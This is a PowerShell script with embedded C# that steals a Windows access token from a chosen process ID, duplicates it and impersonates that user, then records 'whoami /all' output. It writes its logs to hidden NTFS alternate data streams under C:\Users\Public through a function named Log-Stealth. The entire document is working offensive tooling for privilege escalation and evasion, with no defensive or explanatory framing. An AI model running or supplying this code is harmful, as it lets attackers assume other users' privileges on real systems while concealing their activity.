param(
    [int]$Pid,
    [string]$LogFile = "C:\Users\Public\logs.txt:log",
    [string]$WhoamiOutput = "C:\Users\Public\logs.txt:whoami"
)

function Log-Stealth {
    param($msg)
    Add-Content -Path $LogFile -Value "[+] $msg"
}

function Dump-Whoami {
    & whoami /all | Out-File -FilePath $WhoamiOutput -Encoding UTF8
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class TokenUtils {
    public const int TOKEN_QUERY = 0x0008;
    public const int TOKEN_DUPLICATE = 0x0002;

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int intAccess, bool inheritHandle, int pid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr procHandle, UInt32 desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr existingToken, int level, out IntPtr dupToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr token);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@

function Impersonate-TokenFromPID {
    try {
        $hProc = [TokenUtils]::OpenProcess(0x1000, $false, $Pid)
        if ($hProc -eq [IntPtr]::Zero) {
            Log-Stealth "[-] Failed to open process $Pid"
            return $false
        }

        $hToken = [IntPtr]::Zero
        if (-not [TokenUtils]::OpenProcessToken($hProc, 0x0008, [ref]$hToken)) {
            Log-Stealth "[-] Failed to open token for PID $Pid"
            return $false
        }

        $dupToken = [IntPtr]::Zero
        if ([TokenUtils]::DuplicateToken($hToken, 2, [ref]$dupToken)) {
            if ([TokenUtils]::ImpersonateLoggedOnUser($dupToken)) {
                $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                Log-Stealth "[*] Impersonated as: $($id.Name)"
                Dump-Whoami
                return $true
            } else {
                Log-Stealth "[-] Failed to impersonate token"
            }
        }
    } catch {
        Log-Stealth "[-] Exception: $_"
    }
    return $false
}

# MAIN
if (-not (Impersonate-TokenFromPID)) {
    Log-Stealth "[-] Could not impersonate token from PID $Pid"
}
